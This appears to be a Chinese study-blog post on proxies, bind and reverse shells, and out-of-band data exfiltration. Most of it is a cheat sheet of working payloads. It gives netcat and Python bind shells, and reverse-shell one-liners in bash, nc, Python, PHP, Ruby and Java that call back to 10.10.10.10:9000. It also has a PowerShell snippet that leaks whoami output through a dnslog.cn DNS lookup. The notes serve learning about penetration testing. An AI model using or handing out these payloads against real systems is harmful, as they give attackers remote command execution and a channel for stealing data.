---
title: "正反向代理&正反向连接与shell&带外查询"
description: 
slug: 
date: 
image: 
categories:
    - stu
tags:
    - 
weight: 1 
---

## 一、代理

代理服务器：位于客户端与目标服务器之间的流量中转节点，所有通信不直接直连，而是全部经过代理转发

### 1、正向代理

代理服务器替客户端访问目标，目标服务器只能看到代理IP，无法获取真实客户端地址。

```
客户端 → 正向代理服务器 → 目标服务器
```

### 2、反向代理

代理服务器**替后端业务集群**接收客户端请求，客户端只访问反向代理对外暴露的 IP / 域名，完全看不到后端真实业务服务器。

```
客户端 → 反向代理(Nginx/Apache/CDN) → 后端业务服务器集群
```

## 二、正向 Shell & 反弹 Shell

反弹shell生成器:

```
https://forum.ywhack.com/reverse-shell/
```

### 1.正向连接

定义：客户端主动向外发起TCP连接，访问监听端口的服务端

核心：谁主动谁就是客户端

### 2.正向shell

定义：目标机器开启端口监听，攻击者本地主动发起连接，拿到目标交互式命令行

1.目标机器（开启端口监听）

```
nc -lvp 8888 -e /bin/bash
# -l 监听模式（作为服务端）；-v 输出详细日志；-p 指定监听端口；-e 连接成功后绑定bash交互终端
```

```python
python3 -c 'exec("""import socket as s,subprocess as sp;s1=s.socket(s.AF_INET,s.SOCK_STREAM);s1.setsockopt(s.SOL_SOCKET,s.SO_REUSEADDR, 1);s1.bind(("0.0.0.0",9000));s1.listen(1);c,a=s1.accept();
while True: d=c.recv(1024).decode();p=sp.Popen(d,shell=True,stdout=sp.PIPE,stderr=sp.PIPE,stdin=sp.PIPE);c.sendall(p.stdout.read()+p.stderr.read())""")'

python3 -c 'exec("""
# 导入依赖库：socket网络套接字、subprocess执行系统命令
import socket as s,subprocess as sp

# 创建TCP套接字对象
s1=s.socket(s.AF_INET,s.SOCK_STREAM)

# 设置端口复用：程序退出后端口立刻释放，避免端口占用报错
s1.setsockopt(s.SOL_SOCKET,s.SO_REUSEADDR, 1)

# 绑定本机所有网卡0.0.0.0，端口9000，外部任意IP均可连接
s1.bind(("0.0.0.0",9000))

# 开启端口监听，最多等待1个客户端连接
s1.listen(1)

# 阻塞等待客户端连接：接收连接后返回客户端套接字c、客户端地址a
c,a=s1.accept()

# 持续循环，持续接收攻击者下发的命令
while True:
    # 从客户端套接字读取1024字节数据，解码为字符串（攻击者输入的系统命令）
    d=c.recv(1024).decode()
    
    # 创建子进程执行系统命令
    p=sp.Popen(
        d,                  # 待执行的命令字符串
        shell=True,        # 开启系统shell解析命令
        stdout=sp.PIPE,   # 标准输出管道，接收命令正常回显
        stderr=sp.PIPE,   # 标准错误管道，接收命令报错信息
        stdin=sp.PIPE     # 标准输入管道，支持交互式输入
    )
    
    # 将标准输出+标准错误合并，二进制发送回攻击者客户端
    c.sendall(p.stdout.read()+p.stderr.read())
""")'
```

2.攻击者本机（客户端，主动连接目标）

```
nc 1.1.1.1 8888
#1.1.1.1为目标IP，8888是目标监听端口
```

```
# 格式：nc 目标机器IP 监听端口
nc 192.168.16.10 9000
```

### 3.反弹shell

定义：攻击这本地搭建监听服务端，目标机器主动作为客户端，出站连接攻击者IP+端口，将命令行通道反弹给攻击者,使目标系统成为服务器，等待攻击者的系统或控制服务器主动连接。攻击者充当客户端，建立到目标系统的连接。反弹 shell 通常用于渗透测试和攻击。攻击者通过这种方式获得了对目标系统的远程访问和控制权。

Bash:

```
nc -lvnp 9000
sh -i >& /dev/tcp/10.10.10.10/9000 0>&1
```

```
nc -lvnp 9000
sh -i >& /dev/udp/10.10.10.10/9000 0>&1
```

NC：

```
nc -lvnp 9000
nc 10.10.10.10 9000 -e sh #支持-e参数
```

```
nc -lvnp 9000
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.10.10.10 9000 >/tmp/f  #无 - e 参数
```

python：

```
nc -lvnp 9000

python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.10.10",9000));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'
```

PHP：

```
nc -lvnp 9000
php -r '$sock=fsockopen("10.10.10.10",9000);system("sh <&3 >&3 2>&3");'
```

ruby：

```
nc -lvnp 9000
ruby -rsocket -e'exit if fork;c=TCPSocket.new("10.10.10.10","9000");loop{c.gets.chomp!;(exit! if $_=="exit");($_=~/cd (.+)/i?(Dir.chdir($1)):(IO.popen($_,?r){|io|c.print io.read}))rescue c.puts "failed: #{$_}"}'
```

java：

```
nc -lvnp 9000

public class shell {
    public static void main(String[] args) {
        ProcessBuilder pb = new ProcessBuilder("bash", "-c", "$@| bash -i >& /dev/tcp/10.10.10.10/9000 0>&1")
            .redirectErrorStream(true);
        try {
            Process p = pb.start();
            p.waitFor();
            p.destroy();
        } catch (Exception e) {}
    }
}
```

## 三、带外查询（外带通道攻击）

定义：当漏洞**无法直接在页面回显数据**（无输出命令执行、无回显 SQL 盲注、无返回 SSRF 等），不能通过原 HTTP 响应拿到敏感数据时，借助**第三方外网日志服务器**，让目标机器主动向外发起 DNS/HTTP/ICMP 出站请求，将需要窃取的数据嵌入请求报文；攻击者在第三方平台抓取请求日志，间接读取目标敏感数据。

带外：正常漏洞利用走**业务本身的 HTTP 通道**（带内）；带外查询额外新建一条独立外网通信通道传输数据，这条额外通道就是带外

工作原理：

攻击者提前搭建第三方日志接收平台（示例：`dnslog.cn`，专门记录所有 DNS 解析请求）；

构造漏洞载荷，让目标执行指令，把敏感数据拼接成子域名 / URL；

目标服务器主动向外发起 DNS/Ping/HTTP 请求；

第三方平台自动记录请求日志，日志内包含嵌入的敏感数据；

攻击者刷新日志，直接从请求记录中提取目标数据。

实操：

```
$a=whoami;
$b='.83zji3.dnslog.cn';  #注意最前有个点
$a=$a.Replace('\','0000');
$c=$a+$b;
ping $c
```

![](https://img.xiaoyuwell.top/PicGo/20260725211927604.png)

![](https://img.xiaoyuwell.top/PicGo/20260725211732102.png)